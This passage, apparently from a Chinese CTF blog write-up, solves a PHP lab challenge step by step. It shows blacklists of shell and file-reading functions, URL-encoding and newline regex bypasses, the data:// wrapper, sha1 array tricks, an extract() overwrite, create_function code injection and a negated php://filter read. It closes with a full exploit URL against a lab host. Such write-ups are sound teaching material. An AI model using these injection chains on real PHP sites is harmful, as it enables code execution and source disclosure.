 <br>            die(&#x27;fxck you! I hate English!&#x27;); <br>    &#125; <br>&#125; <br><br><span class="hljs-keyword">if</span> (file_get_contents($file) !== &#x27;debu_debu_aqua&#x27;)<br>    die(<span class="hljs-string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);<br><br><br><span class="hljs-keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;<br>    extract($_GET[<span class="hljs-string">&quot;flag&quot;</span>]);<br>    echo <span class="hljs-string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span>&#123;<br>    die(<span class="hljs-string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(preg_match(&#x27;/^[a-z0<span class="hljs-number">-9</span>]*$/isD&#x27;, $code) |<span class="hljs-type">| </span><br><span class="hljs-type">preg_match</span>(&#x27;/fil|<span class="hljs-type">cat</span>|<span class="hljs-type">more</span>|<span class="hljs-type">tail</span>|<span class="hljs-type">tac</span>|<span class="hljs-type">less</span>|<span class="hljs-type">head</span>|<span class="hljs-type">nl</span>|<span class="hljs-type">tailf</span>|<span class="hljs-type">ass</span>|<span class="hljs-type">eval</span>|<span class="hljs-type">sort</span>|<span class="hljs-type">shell</span>|<span class="hljs-type">ob</span>|<span class="hljs-type">start</span>|<span class="hljs-type">mail</span>|<span class="hljs-type">\`|\&#123;|\%|x</span>|<span class="hljs-type">\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou</span>|<span class="hljs-type">show</span>|<span class="hljs-type">cont</span>|<span class="hljs-type">high</span>|<span class="hljs-type">reverse</span>|<span class="hljs-type">flip</span>|<span class="hljs-type">rand</span>|<span class="hljs-type">scan</span>|<span class="hljs-type">chr</span>|<span class="hljs-type">local</span>|<span class="hljs-type">sess</span>|<span class="hljs-type">id</span>|<span class="hljs-type">source</span>|<span class="hljs-type">arra</span>|<span class="hljs-type">head</span>|<span class="hljs-type">light</span>|<span class="hljs-type">print</span>|<span class="hljs-type">echo</span>|<span class="hljs-type">read</span>|<span class="hljs-type">inc</span>|<span class="hljs-type">flag</span>|<span class="hljs-type">1f</span>|<span class="hljs-type">info</span>|<span class="hljs-type">bin</span>|<span class="hljs-type">hex</span>|<span class="hljs-type">oct</span>|<span class="hljs-type">pi</span>|<span class="hljs-type">con</span>|<span class="hljs-type">rot</span>|<span class="hljs-type">input</span>|<span class="hljs-type">\.|log</span>|<span class="hljs-type">\^/i</span>&#x27;, $arg) ) &#123; <br>    die(<span class="hljs-string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); <br>&#125; <span class="hljs-keyword">else</span> &#123; <br>    include <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    $code(&#x27;&#x27;, $arg); <br>&#125; ?&gt;<br></code></pre></td></tr></table></figure>

<p>å¤§æ¦‚çœ‹ä¸€ä¸‹ä»£ç ï¼Œéœ€è¦ä¸€æ­¥æ­¥ç»•è¿‡åˆ°è¾¾æœ€åï¼Œåˆ©ç”¨$code(â€˜â€™,$arg)è¿›è¡Œcreate_functionæ³¨å…¥<br>å…ˆç»•è¿‡ç¬¬ä¸€ä¸ªif</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">if($_SERVER) &#123; <br>    if (<br>        preg_match(&#x27;/shana|<span class="hljs-string">debu</span>|<span class="hljs-string">aqua</span>|<span class="hljs-string">cute</span>|<span class="hljs-string">arg</span>|<span class="hljs-string">code</span>|<span class="hljs-string">flag</span>|<span class="hljs-string">system</span>|<span class="hljs-string">exec</span>|<span class="hljs-string">passwd</span>|<span class="hljs-string">ass</span>|<span class="hljs-string">eval</span>|<span class="hljs-string">sort</span>|<span class="hljs-string">shell</span>|<span class="hljs-string">ob</span>|<span class="hljs-string">start</span>|<span class="hljs-string">mail</span>|<span class="hljs-string">\$</span>|<span class="hljs-string">sou</span>|<span class="hljs-string">show</span>|<span class="hljs-string">cont</span>|<span class="hljs-string">high</span>|<span class="hljs-string">reverse</span>|<span class="hljs-string">flip</span>|<span class="hljs-string">rand</span>|<span class="hljs-string">scan</span>|<span class="hljs-string">chr</span>|<span class="hljs-string">local</span>|<span class="hljs-string">sess</span>|<span class="hljs-string">id</span>|<span class="hljs-string">source</span>|<span class="hljs-string">arra</span>|<span class="hljs-string">head</span>|<span class="hljs-string">light</span>|<span class="hljs-string">read</span>|<span class="hljs-string">inc</span>|<span class="hljs-string">info</span>|<span class="hljs-string">bin</span>|<span class="hljs-string">hex</span>|<span class="hljs-string">oct</span>|<span class="hljs-string">echo</span>|<span class="hljs-string">print</span>|<span class="hljs-string">pi</span>|<span class="hljs-string">\.</span>|<span class="hljs-string">\&quot;</span>|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">log/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;])</span><br><span class="hljs-string">        )  </span><br><span class="hljs-string">        die(&#x27;You seem to want to do something bad?&#x27;); </span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure>
<p>è¿™é‡Œä»‹ç»äº†$_SERVERçš„å››ä¸ªå˜é‡<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_49480008/article/details/115872899">ä¼ é€é—¨</a><br>$_SERVER[â€˜QUERY_STRINGâ€™]è¡¨ç¤ºè¾“å…¥çš„å˜é‡ä»¥åŠå€¼<br>æœ¬åœ°æµ‹è¯•ä¸€ä¸‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$shana</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shana&#x27;</span>];<br><span class="hljs-variable">$passwd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br><span class="hljs-variable">$s</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;s&#x27;</span>];<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;this is &quot;</span>.<span class="hljs-variable">$shana</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;this is &quot;</span>.<span class="hljs-variable">$passwd</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;this is &quot;</span>.<span class="hljs-variable">$s</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-variable">$queryString</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$queryString</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//shana=123&amp;passwd=456  s=789</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/292EE94F8AAC4fa2ADB3C7DD388E7913.png" srcset="/img/loading.gif" lazyload><br>å°†GETä¿®æ”¹ä¸€ä¸‹ï¼Œè¿›è¡Œurlç¼–ç </p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?shana<span class="hljs-operator">=</span><span class="hljs-number">123</span>&amp;passwd<span class="hljs-operator">=</span><span class="hljs-variable">%34</span><span class="hljs-variable">%35</span><span class="hljs-variable">%36</span>  s<span class="hljs-operator">=</span><span class="hljs-variable">%37</span><span class="hljs-variable">%38</span><span class="hljs-variable">%39</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/92817E054B1F4c78BAD7A5F06DF8926F.png" srcset="/img/loading.gif" lazyload><br>å‘ç°GETä¼ å‚çš„æ—¶å€™ä¼šå¯¹getä¼ çš„å‚æ•°è¿›è¡Œurlç¼–ç ï¼Œä½†æ˜¯$_SERVER[â€˜QUERY_STRINGâ€™]å´ä¸ä¼šã€‚<br>æ‰€ä»¥è¯´å¯¹äºç¬¬ä¸€ä¸ªifçš„æ‰€æœ‰å­—æ¯å’Œå­—ç¬¦ï¼Œéƒ½å¯ä»¥ç”¨urlç¼–ç è¿›è¡Œç»•è¿‡</p>
<p>å†çœ‹ç¬¬äºŒä¸ªif</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|https/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>] !== <span class="hljs-string">&#x27;aqua_is_cute&#x27;</span>) &#123; <br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>]; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;<br>    &#125; <br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);<br></code></pre></td></tr></table></figure>

<p>å…ˆçœ‹ç¬¬äºŒä¸ªif<br>^$è¡¨ç¤ºåŒ¹é…é¦–å°¾<br>ç”±äºpreg_matchè¿™ä¸ªå‡½æ•°æ˜¯åªèƒ½åŒ¹é…ä¸€è¡Œçš„æ•°æ®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨%0a(æ¢è¡Œç¬¦)æ¥ç»•è¿‡<br>è¿™æ˜¯å› ä¸º$ä¼šå¿½ç•¥æ¢è¡Œç¬¦<br>payload</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?<span class="hljs-keyword">file</span>=<span class="hljs-number">1</span>&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a<br></code></pre></td></tr></table></figure>
<p>è¿™é‡Œå› ä¸ºdebuè¢«ç¬¬ä¸€ä¸ªifè¿‡æ»¤ï¼Œæ‰€ä»¥urlç¼–ç ç»•è¿‡ä¸€ä¸‹</p>
<p>å†æ¥çœ‹ç¬¬ä¸‰ä¸ªif</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_REQUEST</span>) &#123; <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_REQUEST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="hljs-variable">$value</span>))  <br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fxck you! I hate English!&#x27;</span>); <br>    &#125; <br>&#125;<br></code></pre></td></tr></table></figure>
<p>$_REQUESTåœ¨åŒæ—¶æ¥æ”¶GETå’ŒPOSTå‚æ•°æ—¶ï¼ŒPOSTä¼˜å…ˆçº§æ›´é«˜</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$shana</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shana&#x27;</span>];<br><span class="hljs-variable">$passwd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br><span class="hljs-variable">$s</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;s&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;shana is &quot;</span>.<span class="hljs-variable">$shana</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;passwd is &quot;</span>.<span class="hljs-variable">$passwd</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;s is &quot;</span>.<span class="hljs-variable">$s</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_REQUEST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Key: &quot;</span> . <span class="hljs-variable">$key</span> . <span class="hljs-string">&quot;, Value: &quot;</span> . <span class="hljs-variable">$value</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//GETè¾“å…¥?shana=123&amp;passwd=456</span><br><span class="hljs-comment">//POSTè¾“å…¥s=789&amp;shana=fake1&amp;passwd=fake2</span><br><br></code></pre></td></tr></table></figure>

<p><img src="/images/17B04C7BA45F4021832B0F1174DE707C.png" srcset="/img/loading.gif" lazyload><br>å¯¹äºè¿™ä¸ªif</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span><br><span class="hljs-attribute">debu</span>=<span class="hljs-number">1</span>&amp;file=<span class="hljs-number">2</span><br><br></code></pre></td></tr></table></figure>

<p>å†çœ‹ç¬¬å››ä¸ªif</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-keyword">if</span> <span class="hljs-comment">(file_get_contents($file)</span> !== <span class="hljs-string">&#x27;debu_debu_aqua&#x27;</span>)<br>    die<span class="hljs-comment">(&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;)</span>;<br></code></pre></td></tr></table></figure>

<p>ç”¨dataä¼ªåè®®ç»•è¿‡data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aqua</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">file<span class="hljs-operator">=</span><span class="hljs-variable">%64</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%61</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%2</span>f<span class="hljs-variable">%2</span>f<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%61</span><span class="hljs-variable">%71</span><span class="hljs-variable">%75</span><span class="hljs-variable">%61</span><br></code></pre></td></tr></table></figure>

<p>ç¬¬äº”ä¸ªif</p>
<figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs smalltalk">if ( sha1(<span class="hljs-string">$s</span>hana) === sha1(<span class="hljs-string">$p</span>asswd) &amp;&amp; <span class="hljs-string">$s</span>hana != <span class="hljs-string">$p</span>asswd )&#123;<br>    extract(<span class="hljs-string">$_</span>GET[<span class="hljs-comment">&quot;flag&quot;</span>]);<br>    echo <span class="hljs-comment">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;<br>&#125; else&#123;<br>    die(<span class="hljs-comment">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>sha1()å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ï¼Œshanaå’Œpasswdéƒ½æ˜¯æ•°ç»„æ—¶éƒ½æ˜¯false<code>$shana[]=1&amp;passwd[]=2</code><br>ç¬¬ä¸€ä¸ªifæŠŠshanaå’Œpasswdè¿‡æ»¤äº†ï¼Œurlç¼–ç ç»•è¿‡(GETä¼ å‚æ—¶GETé‡Œé¢å‚æ•°çš„[]å’Œè¿æ¥å˜é‡çš„&amp;è¿˜æœ‰ç»™å˜é‡èµ‹å€¼çš„&#x3D;ç¼–ç åGETä¼ å‚æ—¶ä¸ä¼šè¢«è§£ç )</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-meta">%</span><span class="hljs-number">73</span><span class="hljs-meta">%</span><span class="hljs-number">68</span><span class="hljs-meta">%</span><span class="hljs-number">61</span><span class="hljs-meta">%</span><span class="hljs-number">6</span>e<span class="hljs-meta">%</span><span class="hljs-number">61</span>[]=<span class="hljs-number">1</span>&amp;<span class="hljs-meta">%</span><span class="hljs-number">70</span><span class="hljs-meta">%</span><span class="hljs-number">61</span><span class="hljs-meta">%</span><span class="hljs-number">73</span><span class="hljs-meta">%</span><span class="hljs-number">73</span><span class="hljs-meta">%</span><span class="hljs-number">77</span><span class="hljs-meta">%</span><span class="hljs-number">64</span>[]=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>

<p>æœ€åä¸€ä¸ªif</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">if(preg_match(&#x27;/^[a-z0-9]<span class="hljs-symbol">*</span>$/isD&#x27;, $code) ||<span class="hljs-string"> </span><br><span class="hljs-string">preg_match(&#x27;/fil</span>|<span class="hljs-string">cat</span>|<span class="hljs-string">more</span>|<span class="hljs-string">tail</span>|<span class="hljs-string">tac</span>|<span class="hljs-string">less</span>|<span class="hljs-string">head</span>|<span class="hljs-string">nl</span>|<span class="hljs-string">tailf</span>|<span class="hljs-string">ass</span>|<span class="hljs-string">eval</span>|<span class="hljs-string">sort</span>|<span class="hljs-string">shell</span>|<span class="hljs-string">ob</span>|<span class="hljs-string">start</span>|<span class="hljs-string">mail</span>|<span class="hljs-string">\`</span>|<span class="hljs-string">\&#123;</span>|<span class="hljs-string">\%</span>|<span class="hljs-string">x</span>|<span class="hljs-string">\&amp;</span>|<span class="hljs-string">\$</span>|<span class="hljs-string">\*</span>|<span class="hljs-string">\</span>||<span class="hljs-string">\&lt;</span>|<span class="hljs-string">\&quot;</span>|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">\=</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">sou</span>|<span class="hljs-string">show</span>|<span class="hljs-string">cont</span>|<span class="hljs-string">high</span>|<span class="hljs-string">reverse</span>|<span class="hljs-string">flip</span>|<span class="hljs-string">rand</span>|<span class="hljs-string">scan</span>|<span class="hljs-string">chr</span>|<span class="hljs-string">local</span>|<span class="hljs-string">sess</span>|<span class="hljs-string">id</span>|<span class="hljs-string">source</span>|<span class="hljs-string">arra</span>|<span class="hljs-string">head</span>|<span class="hljs-string">light</span>|<span class="hljs-string">print</span>|<span class="hljs-string">echo</span>|<span class="hljs-string">read</span>|<span class="hljs-string">inc</span>|<span class="hljs-string">flag</span>|<span class="hljs-string">1f</span>|<span class="hljs-string">info</span>|<span class="hljs-string">bin</span>|<span class="hljs-string">hex</span>|<span class="hljs-string">oct</span>|<span class="hljs-string">pi</span>|<span class="hljs-string">con</span>|<span class="hljs-string">rot</span>|<span class="hljs-string">input</span>|<span class="hljs-string">\.</span>|<span class="hljs-string">log</span>|<span class="hljs-string">\^/i&#x27;, $arg) ) &#123; </span><br><span class="hljs-string">    die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;); </span><br><span class="hljs-string">&#125; else &#123; </span><br><span class="hljs-string">    include &quot;flag.php&quot;;</span><br><span class="hljs-string">    $code(&#x27;&#x27;, $arg); </span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure>

<p>çœ‹å›å‰é¢</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$file = <span class="hljs-string">&quot;1nD3x.php&quot;</span><span class="hljs-comment">;</span><br>$shana = $_GET[<span class="hljs-string">&#x27;shana&#x27;</span>]<span class="hljs-comment">;</span><br>$passwd = $_GET[<span class="hljs-string">&#x27;passwd&#x27;</span>]<span class="hljs-comment">;</span><br>$arg = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-comment">;</span><br>$code = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
<p>codeä¸argçš„å€¼éƒ½ä¸ºç©ºå€¼ï¼Œæ­£å¸¸æƒ…å†µä¸‹æ˜¯ä¸èƒ½ä¿®æ”¹å®ƒä»¬çš„å€¼çš„ï¼Œä½†ç”±äºç¬¬äº”ä¸ªifä¸­çš„extract()å‡½æ•°ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¯¹å¼€å¤´å¤„çš„ä¸¤ä¸ªå˜é‡è¿›è¡Œæ“æ§<br>æœ¬åœ°æµ‹è¯•ä¸€ä¸‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;flag&quot;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;arg= &#x27;</span>.<span class="hljs-variable">$arg</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;code= &#x27;</span>.<span class="hljs-variable">$code</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/D9436627026B4cc08D8BB09D35FF18C3.png" srcset="/img/loading.gif" lazyload><br>å› ä¸º$codeå’Œ$argå¯æ§ï¼Œåˆ©ç”¨$code(â€˜â€™,$arg)è¿›è¡Œ<a target="_blank" rel="noopener" href="https://blog.csdn.net/while0/article/details/72276440">create_functionæ³¨å…¥</a><br>$arg&#x3D;}ä»£ç ;&#x2F;&#x2F;,åˆ™}é—­åˆäº†å‡½æ•°ï¼ŒåŒæ—¶&#x2F;&#x2F;æ³¨é‡Šäº†åé¢çš„å†…å®¹<br>æ„é€ flag[code]&#x3D;create_function&amp;flag[arg]&#x3D;}var_dump(get_defined_vars());&#x2F;&#x2F;</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span>[<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span>]<span class="hljs-operator">=</span>create_function&amp;<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span>[<span class="hljs-variable">%61</span><span class="hljs-variable">%72</span><span class="hljs-variable">%67</span>]<span class="hljs-operator">=</span>&#125;var_dump(get_defined_vars())<span class="hljs-comment">;//</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/65286D129FD94939A53D534FF5A2900E.png" srcset="/img/loading.gif" lazyload><br>å‘ç°æœ€å</p>
<figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smalltalk">[<span class="hljs-comment">&quot;ffffffff11111114ggggg&quot;</span>]=&gt; string(<span class="hljs-number">89</span>) <span class="hljs-comment">&quot;Baka, do you think it&#x27;s so easy to get my flag? I hid the real flag in rea1fl4g.php 23333&quot;</span> &#125;<br></code></pre></td></tr></table></figure>
<p>ç”±äºç¬¬æœ€åä¸€ä¸ªifå¤„è¿‡æ»¤äº†readæ‰€ä»¥åœ¨è¿™é‡Œå–åç»•è¿‡ä¸€ä¸‹</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">echo</span> urlencode<span class="hljs-params">(~&#x27;php://filter/<span class="hljs-attr">read</span>=convert.base64-encode/<span class="hljs-attr">resource</span>=rea1fl4g.php&#x27;)</span>;<br></code></pre></td></tr></table></figure>
<p>ç”¨require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f))<br>æ›¿æ¢åˆšæ‰çš„var_dump(get_defined_vars())è¢«ç¼–ç çš„éƒ¨åˆ†å³å¯ã€‚</p>
<p>æœ€ç»ˆçš„ä»£ç </p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">http:</span>//<span class="hljs-number">23</span>ae<span class="hljs-number">7090</span>-b<span class="hljs-number">51</span>b<span class="hljs-number">-4e0</span>b<span class="hljs-number">-921</span>f<span class="hljs-number">-964</span>eaf<span class="hljs-number">520e03</span>.node<span class="hljs-number">5</span>.buuoj.cn:<span class="hljs-number">81</span>/<span class="hljs-number">1</span>nD<span class="hljs-number">3</span><span class="hljs-keyword">x</span>.php?file<span class="hljs-operator">=</span><span class="hljs-variable">%64</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%61</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%2</span>f<span class="hljs-variable">%2</span>f<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%61</span><span class="hljs-variable">%71</span><span class="hljs-variable">%75</span><span class="hljs-variable">%61</span>&amp;<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-operator">=</span><span class="hljs-variable">%61</span><span class="hljs-variable">%71</span><span class="hljs-variable">%75</span><span class="hljs-variable">%61</span><span 